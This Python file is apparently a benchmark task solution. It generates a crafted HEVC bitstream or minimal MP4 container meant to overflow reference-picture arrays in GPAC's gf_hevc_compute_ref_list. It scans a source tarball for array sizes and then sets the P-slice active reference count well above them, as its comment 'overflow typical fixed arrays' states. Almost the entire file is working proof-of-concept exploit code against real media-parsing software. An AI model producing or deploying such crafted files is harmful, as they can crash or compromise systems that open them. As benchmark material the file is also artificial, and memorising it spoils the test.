import os
import re
import struct
import tarfile
from typing import Dict, List, Optional, Tuple


class BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self):
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, b: int) -> None:
        self._cur = (self._cur << 1) | (1 if b else 0)
        self._nbits += 1
        if self._nbits == 8:
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def write_ue(self, v: int) -> None:
        if v < 0:
            v = 0
        code_num = v + 1
        n = code_num.bit_length() - 1
        for _ in range(n):
            self.write_bit(0)
        self.write_bit(1)
        if n:
            self.write_bits(code_num - (1 << n), n)

    def write_se(self, v: int) -> None:
        if v == 0:
            self.write_ue(0)
            return
        if v > 0:
            code_num = 2 * v - 1
        else:
            code_num = -2 * v
        self.write_ue(code_num)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        while self._nbits != 0:
            self.write_bit(0)

    def get_bytes(self) -> bytes:
        if self._nbits:
            self._buf.append((self._cur << (8 - self._nbits)) & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zcount = 0
    for b in rbsp:
        if zcount >= 2 and b <= 3:
            out.append(3)
            zcount = 0
        out.append(b)
        if b == 0:
            zcount += 1
        else:
            zcount = 0
    return bytes(out)


def hevc_nal_header(nal_unit_type: int, nuh_layer_id: int = 0, nuh_temporal_id_plus1: int = 1) -> bytes:
    b0 = ((nal_unit_type & 0x3F) << 1) | ((nuh_layer_id >> 5) & 0x01)
    b1 = ((nuh_layer_id & 0x1F) << 3) | (nuh_temporal_id_plus1 & 0x07)
    return bytes([b0, b1])


def make_hevc_nal(nal_unit_type: int, rbsp_payload: bytes) -> bytes:
    return hevc_nal_header(nal_unit_type) + rbsp_to_ebsp(rbsp_payload)


def write_profile_tier_level(bw: BitWriter, max_sub_layers_minus1: int) -> None:
    # general_profile_space(2), general_tier_flag(1), general_profile_idc(5)
    bw.write_bits(0, 2)
    bw.write_bits(0, 1)
    bw.write_bits(1, 5)  # Main profile
    bw.write_bits(0, 32)  # general_profile_compatibility_flags
    bw.write_bits(0, 48)  # general_constraint_indicator_flags
    bw.write_bits(120, 8)  # general_level_idc

    # sub_layer_profile_present_flag[], sub_layer_level_present_flag[]
    for _ in range(max_sub_layers_minus1):
        bw.write_bit(0)
        bw.write_bit(0)

    if max_sub_layers_minus1 > 0:
        for _ in range(8 - max_sub_layers_minus1):
            bw.write_bits(0, 2)

    for _ in range(max_sub_layers_minus1):
        # no sub-layer profile/level data since flags are 0
        pass


def build_vps_rbsp() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 4)  # vps_video_parameter_set_id
    bw.write_bit(1)      # vps_base_layer_internal_flag
    bw.write_bit(1)      # vps_base_layer_available_flag
    bw.write_bits(0, 6)  # vps_max_layers_minus1
    bw.write_bits(0, 3)  # vps_max_sub_layers_minus1
    bw.write_bit(1)      # vps_temporal_id_nesting_flag
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    write_profile_tier_level(bw, 0)
    bw.write_bit(1)      # vps_sub_layer_ordering_info_present_flag
    # i = 0..0
    bw.write_ue(0)       # vps_max_dec_pic_buffering_minus1
    bw.write_ue(0)       # vps_max_num_reorder_pics
    bw.write_ue(0)       # vps_max_latency_increase_plus1
    bw.write_bits(0, 6)  # vps_max_layer_id
    bw.write_ue(0)       # vps_num_layer_sets_minus1
    bw.write_bit(0)      # vps_timing_info_present_flag
    bw.write_bit(0)      # vps_extension_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def build_sps_rbsp() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 4)  # sps_video_parameter_set_id
    bw.write_bits(0, 3)  # sps_max_sub_layers_minus1
    bw.write_bit(1)      # sps_temporal_id_nesting_flag
    write_profile_tier_level(bw, 0)
    bw.write_ue(0)       # sps_seq_parameter_set_id
    bw.write_ue(1)       # chroma_format_idc (4:2:0)
    bw.write_ue(16)      # pic_width_in_luma_samples
    bw.write_ue(16)      # pic_height_in_luma_samples
    bw.write_bit(0)      # conformance_window_flag
    bw.write_ue(0)       # bit_depth_luma_minus8
    bw.write_ue(0)       # bit_depth_chroma_minus8
    bw.write_ue(4)       # log2_max_pic_order_cnt_lsb_minus4 => 8 bits
    bw.write_bit(1)      # sps_sub_layer_ordering_info_present_flag
    bw.write_ue(2)       # sps_max_dec_pic_buffering_minus1 (>= num refs)
    bw.write_ue(0)       # sps_max_num_reorder_pics
    bw.write_ue(0)       # sps_max_latency_increase_plus1

    bw.write_ue(0)       # log2_min_luma_coding_block_size_minus3
    bw.write_ue(0)       # log2_diff_max_min_luma_coding_block_size
    bw.write_ue(0)       # log2_min_luma_transform_block_size_minus2
    bw.write_ue(0)       # log2_diff_max_min_luma_transform_block_size
    bw.write_ue(0)       # max_transform_hierarchy_depth_inter
    bw.write_ue(0)       # max_transform_hierarchy_depth_intra
    bw.write_bit(0)      # scaling_list_enabled_flag
    bw.write_bit(0)      # amp_enabled_flag
    bw.write_bit(0)      # sample_adaptive_offset_enabled_flag
    bw.write_bit(0)      # pcm_enabled_flag

    bw.write_ue(1)       # num_short_term_ref_pic_sets
    # st_ref_pic_set(0): inter_ref_pic_set_prediction_flag = 0
    bw.write_bit(0)
    bw.write_ue(1)       # num_negative_pics
    bw.write_ue(0)       # num_positive_pics
    bw.write_ue(0)       # delta_poc_s0_minus1[0] => delta = -1
    bw.write_bit(1)      # used_by_curr_pic_s0_flag[0]

    bw.write_bit(0)      # long_term_ref_pics_present_flag
    bw.write_bit(0)      # sps_temporal_mvp_enabled_flag
    bw.write_bit(0)      # strong_intra_smoothing_enabled_flag
    bw.write_bit(0)      # vui_parameters_present_flag
    bw.write_bit(0)      # sps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def build_pps_rbsp() -> bytes:
    bw = BitWriter()
    bw.write_ue(0)       # pps_pic_parameter_set_id
    bw.write_ue(0)       # pps_seq_parameter_set_id
    bw.write_bit(0)      # dependent_slice_segments_enabled_flag
    bw.write_bit(0)      # output_flag_present_flag
    bw.write_bits(0, 3)  # num_extra_slice_header_bits
    bw.write_bit(0)      # sign_data_hiding_enabled_flag
    bw.write_bit(0)      # cabac_init_present_flag
    bw.write_ue(0)       # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)       # num_ref_idx_l1_default_active_minus1
    bw.write_se(0)       # init_qp_minus26
    bw.write_bit(0)      # constrained_intra_pred_flag
    bw.write_bit(0)      # transform_skip_enabled_flag
    bw.write_bit(0)      # cu_qp_delta_enabled_flag
    bw.write_se(0)       # pps_cb_qp_offset
    bw.write_se(0)       # pps_cr_qp_offset
    bw.write_bit(0)      # pps_slice_chroma_qp_offsets_present_flag
    bw.write_bit(0)      # weighted_pred_flag
    bw.write_bit(0)      # weighted_bipred_flag
    bw.write_bit(0)      # transquant_bypass_enabled_flag
    bw.write_bit(0)      # tiles_enabled_flag
    bw.write_bit(0)      # entropy_coding_sync_enabled_flag
    bw.write_bit(0)      # pps_loop_filter_across_slices_enabled_flag
    bw.write_bit(0)      # deblocking_filter_control_present_flag
    bw.write_bit(0)      # pps_scaling_list_data_present_flag
    bw.write_bit(0)      # lists_modification_present_flag
    bw.write_ue(0)       # log2_parallel_merge_level_minus2
    bw.write_bit(0)      # slice_segment_header_extension_present_flag
    bw.write_bit(0)      # pps_extension_present_flag
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def build_aud_rbsp(pic_type: int = 0) -> bytes:
    bw = BitWriter()
    bw.write_bits(pic_type & 0x7, 3)
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def build_slice_rbsp_idr() -> bytes:
    bw = BitWriter()
    bw.write_bit(1)      # first_slice_segment_in_pic_flag
    bw.write_bit(0)      # no_output_of_prior_pics_flag (IRAP)
    bw.write_ue(0)       # slice_pic_parameter_set_id
    bw.write_ue(2)       # slice_type = I
    bw.write_se(0)       # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def build_slice_rbsp_p(num_ref_idx_l0_active_minus1: int) -> bytes:
    bw = BitWriter()
    bw.write_bit(1)      # first_slice_segment_in_pic_flag
    bw.write_ue(0)       # slice_pic_parameter_set_id
    bw.write_ue(1)       # slice_type = P
    bw.write_bits(1, 8)  # slice_pic_order_cnt_lsb (8 bits)
    bw.write_bit(1)      # short_term_ref_pic_set_sps_flag
    bw.write_bit(1)      # num_ref_idx_active_override_flag
    bw.write_ue(num_ref_idx_l0_active_minus1)
    bw.write_ue(0)       # five_minus_max_num_merge_cand
    bw.write_se(0)       # slice_qp_delta
    bw.rbsp_trailing_bits()
    return bw.get_bytes()


def u8(x: int) -> bytes:
    return struct.pack(">B", x & 0xFF)


def u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def box(typ: bytes, data: bytes) -> bytes:
    return u32(8 + len(data)) + typ + data


def full_box(typ: bytes, version: int, flags: int, data: bytes) -> bytes:
    hdr = bytes([version & 0xFF]) + (flags & 0xFFFFFF).to_bytes(3, "big")
    return box(typ, hdr + data)


def pack_language_und() -> int:
    # 'und' => 0x55C4 in ISO-639 packed 5-bit fields.
    return 0x55C4


def build_hvcc(vps: bytes, sps: bytes, pps: bytes, length_size_minus_one: int = 3) -> bytes:
    # vps/sps/pps are complete NAL units (header+ebsp) to store in arrays.
    record = bytearray()
    record += b"\x01"  # configurationVersion
    # general_profile_space(2)=0, general_tier_flag(1)=0, general_profile_idc(5)=1
    record += bytes([0x01])
    record += u32(0)  # general_profile_compatibility_flags
    record += (0).to_bytes(6, "big")  # general_constraint_indicator_flags
    record += b"\x78"  # general_level_idc = 120
    record += u16(0xF000)  # reserved(4 bits 1111) + min_spatial_segmentation_idc(12)=0
    record += b"\xFC"      # reserved(6 bits 111111) + parallelismType(2)=0
    record += b"\xFD"      # reserved(6 bits 111111) + chromaFormat(2)=1
    record += b"\xF8"      # reserved(5 bits 11111) + bitDepthLumaMinus8(3)=0
    record += b"\xF8"      # reserved(5 bits 11111) + bitDepthChromaMinus8(3)=0
    record += u16(0)       # avgFrameRate
    # constantFrameRate(2)=0, numTemporalLayers(3)=1, temporalIdNested(1)=1, lengthSizeMinusOne(2)
    record += bytes([(0 << 6) | (1 << 3) | (1 << 2) | (length_size_minus_one & 0x3)])

    arrays = []
    # array_completeness(1)=1, reserved(1)=0, nal_unit_type(6)
    for nal_type, nal in ((32, vps), (33, sps), (34, pps)):
        arr = bytearray()
        arr += bytes([0x80 | (nal_type & 0x3F)])
        arr += u16(1)  # numNalus
        arr += u16(len(nal))
        arr += nal
        arrays.append(bytes(arr))

    record += bytes([len(arrays)])
    for a in arrays:
        record += a
    return box(b"hvcC", bytes(record))


def build_visual_sample_entry_hvc1(hvcc_box: bytes, width: int = 16, height: int = 16) -> bytes:
    # VisualSampleEntry fields + contained boxes (hvcC)
    d = bytearray()
    d += b"\x00" * 6  # reserved
    d += u16(1)       # data_reference_index
    d += u16(0)       # pre_defined
    d += u16(0)       # reserved
    d += b"\x00" * 12 # pre_defined
    d += u16(width)
    d += u16(height)
    d += u32(0x00480000)  # horizresolution 72 dpi
    d += u32(0x00480000)  # vertresolution 72 dpi
    d += u32(0)           # reserved
    d += u16(1)           # frame_count
    # compressorname 32 bytes: first byte length, then name, padded
    name = b"gpac"
    comp = bytes([len(name)]) + name + b"\x00" * (31 - len(name))
    d += comp
    d += u16(0x0018)      # depth
    d += u16(0xFFFF)      # pre_defined
    d += hvcc_box
    return box(b"hvc1", bytes(d))


def build_minimal_mp4_hevc(samples: List[bytes], hvcc_box: bytes, width: int = 16, height: int = 16) -> bytes:
    # ftyp
    ftyp = box(b"ftyp", b"isom" + u32(0x200) + b"isom" + b"iso2" + b"mp41")

    # mvhd
    mvhd_data = bytearray()
    mvhd_data += u32(0)  # creation_time
    mvhd_data += u32(0)  # modification_time
    mvhd_data += u32(90000)  # timescale
    mvhd_data += u32(max(1, len(samples)))  # duration
    mvhd_data += u32(0x00010000)  # rate 1.0
    mvhd_data += u16(0x0100)      # volume 1.0
    mvhd_data += u16(0)           # reserved
    mvhd_data += u32(0) + u32(0)  # reserved
    # matrix (identity)
    mvhd_data += u32(0x00010000) + u32(0) + u32(0)
    mvhd_data += u32(0) + u32(0x00010000) + u32(0)
    mvhd_data += u32(0) + u32(0) + u32(0x40000000)
    mvhd_data += b"\x00" * 24     # pre_defined
    mvhd_data += u32(2)           # next_track_id
    mvhd = full_box(b"mvhd", 0, 0, bytes(mvhd_data))

    # tkhd
    tkhd_data = bytearray()
    tkhd_data += u32(0)  # creation
    tkhd_data += u32(0)  # modification
    tkhd_data += u32(1)  # track_id
    tkhd_data += u32(0)  # reserved
    tkhd_data += u32(max(1, len(samples)))  # duration
    tkhd_data += u32(0) + u32(0)  # reserved
    tkhd_data += u16(0)  # layer
    tkhd_data += u16(0)  # alternate_group
    tkhd_data += u16(0)  # volume (0 for video)
    tkhd_data += u16(0)  # reserved
    tkhd_data += u32(0x00010000) + u32(0) + u32(0)
    tkhd_data += u32(0) + u32(0x00010000) + u32(0)
    tkhd_data += u32(0) + u32(0) + u32(0x40000000)
    tkhd_data += u32(width << 16)
    tkhd_data += u32(height << 16)
    tkhd = full_box(b"tkhd", 0, 0x000007, bytes(tkhd_data))

    # mdhd
    mdhd_data = bytearray()
    mdhd_data += u32(0)  # creation
    mdhd_data += u32(0)  # modification
    mdhd_data += u32(90000)  # timescale
    mdhd_data += u32(max(1, len(samples)))  # duration
    mdhd_data += u16(pack_language_und())
    mdhd_data += u16(0)
    mdhd = full_box(b"mdhd", 0, 0, bytes(mdhd_data))

    # hdlr (vide)
    hdlr_data = bytearray()
    hdlr_data += u32(0)       # pre_defined
    hdlr_data += b"vide"      # handler_type
    hdlr_data += u32(0) + u32(0) + u32(0)  # reserved
    hdlr_data += b"VideoHandler\x00"
    hdlr = full_box(b"hdlr", 0, 0, bytes(hdlr_data))

    # vmhd
    vmhd_data = u16(0) + u16(0) + u16(0) + u16(0)  # graphicsmode + opcolor
    vmhd = full_box(b"vmhd", 0, 0x000001, vmhd_data)

    # dinf/dref/url
    url = full_box(b"url ", 0, 0x000001, b"")
    dref = full_box(b"dref", 0, 0, u32(1) + url)
    dinf = box(b"dinf", dref)

    # stsd
    sample_entry = build_visual_sample_entry_hvc1(hvcc_box, width=width, height=height)
    stsd = full_box(b"stsd", 0, 0, u32(1) + sample_entry)

    # stts (all samples have delta 1)
    stts = full_box(b"stts", 0, 0, u32(1) + u32(len(samples)) + u32(1))

    # stsc (one chunk, all samples)
    stsc = full_box(b"stsc", 0, 0, u32(1) + u32(1) + u32(len(samples)) + u32(1))

    # stsz (variable sizes)
    sizes = b"".join(u32(len(s)) for s in samples)
    stsz = full_box(b"stsz", 0, 0, u32(0) + u32(len(samples)) + sizes)

    # stco (placeholder offset)
    stco_placeholder = full_box(b"stco", 0, 0, u32(1) + u32(0))

    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_placeholder)
    minf = box(b"minf", vmhd + dinf + stbl)
    mdia = box(b"mdia", mdhd + hdlr + minf)
    trak = box(b"trak", tkhd + mdia)
    moov = box(b"moov", mvhd + trak)

    mdat_payload = b"".join(samples)
    mdat = box(b"mdat", mdat_payload)

    # compute and patch stco offset (chunk offset to start of mdat payload)
    chunk_offset = len(ftyp) + len(moov) + 8  # mdat header is 8 bytes
    stco = full_box(b"stco", 0, 0, u32(1) + u32(chunk_offset))

    # rebuild stbl/minf/mdia/trak/moov with patched stco
    stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)
    minf = box(b"minf", vmhd + dinf + stbl)
    mdia = box(b"mdia", mdhd + hdlr + minf)
    trak = box(b"trak", tkhd + mdia)
    moov = box(b"moov", mvhd + trak)

    return ftyp + moov + mdat


def make_length_prefixed_sample(nals: List[bytes]) -> bytes:
    out = bytearray()
    for nal in nals:
        out += u32(len(nal))
        out += nal
    return bytes(out)


def scan_tar_for_hints(src_path: str) -> Tuple[bool, int]:
    """
    Returns (wants_mp4, ref_limit_guess)
    ref_limit_guess is used to pick num_ref_idx_l0_active_minus1.
    """
    wants_mp4 = False
    ref_limit_guess = 16

    func_buf = None

    def maybe_update_limit_from_text(text: str) -> None:
        nonlocal ref_limit_guess
        # Find numeric bracket sizes in/near the compute function (stack arrays often have fixed sizes)
        for m in re.finditer(r"\[\s*(\d{1,4})\s*\]", text):
            try:
                n = int(m.group(1))
            except Exception:
                continue
            if 4 <= n <= 512:
                if n > ref_limit_guess:
                    ref_limit_guess = n

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for mi in tf.getmembers():
                name = mi.name
                lname = name.lower()
                if mi.size <= 0 or mi.size > 2_000_000:
                    continue
                if not (lname.endswith(".c") or lname.endswith(".h") or lname.endswith(".cpp") or lname.endswith(".cc")):
                    continue
                f = tf.extractfile(mi)
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    text = data.decode("latin1", "ignore")

                if not wants_mp4:
                    if ("gf_isom_open" in text) or ("gf_isom_open_mem" in text) or ("isomedia" in text) or ("isobmff" in text):
                        wants_mp4 = True

                if func_buf is None and "gf_hevc_compute_ref_list" in text and "{" in text:
                    # Try to capture around function body
                    idx = text.find("gf_hevc_compute_ref_list")
                    if idx != -1:
                        snippet = text[idx: idx + 20000]
                        if re.search(r"gf_hevc_compute_ref_list\s*\([^)]*\)\s*\{", snippet):
                            func_buf = snippet

                if func_buf is not None and ref_limit_guess < 128:
                    # also scan current file if it contains likely list sizes
                    if "RefPicList" in text or "ref_list" in text or "refPicList" in text:
                        maybe_update_limit_from_text(text)
            if func_buf is not None:
                maybe_update_limit_from_text(func_buf)
    except Exception:
        pass

    # choose a safe but "large enough" active ref count to overflow typical fixed arrays
    limit = ref_limit_guess
    if limit < 16:
        limit = 16
    # ensure we exceed by a meaningful margin, but keep bounded
    num_refs = max(64, min(256, limit + 17))
    # return minus1 value
    return wants_mp4, num_refs


class Solution:
    def solve(self, src_path: str) -> bytes:
        wants_mp4, num_refs = scan_tar_for_hints(src_path)
        num_ref_idx_l0_active_minus1 = max(0, num_refs - 1)

        vps = make_hevc_nal(32, build_vps_rbsp())
        sps = make_hevc_nal(33, build_sps_rbsp())
        pps = make_hevc_nal(34, build_pps_rbsp())

        aud_i = make_hevc_nal(35, build_aud_rbsp(0))
        idr = make_hevc_nal(19, build_slice_rbsp_idr())

        aud_p = make_hevc_nal(35, build_aud_rbsp(1))
        psl = make_hevc_nal(1, build_slice_rbsp_p(num_ref_idx_l0_active_minus1))

        if wants_mp4:
            hvcc = build_hvcc(vps, sps, pps, length_size_minus_one=3)
            sample1 = make_length_prefixed_sample([aud_i, idr])
            sample2 = make_length_prefixed_sample([aud_p, psl])
            return build_minimal_mp4_hevc([sample1, sample2], hvcc, width=16, height=16)

        # Annex-B fallback
        sc = b"\x00\x00\x00\x01"
        return sc + vps + sc + sps + sc + pps + sc + aud_i + sc + idr + sc + aud_p + sc + psl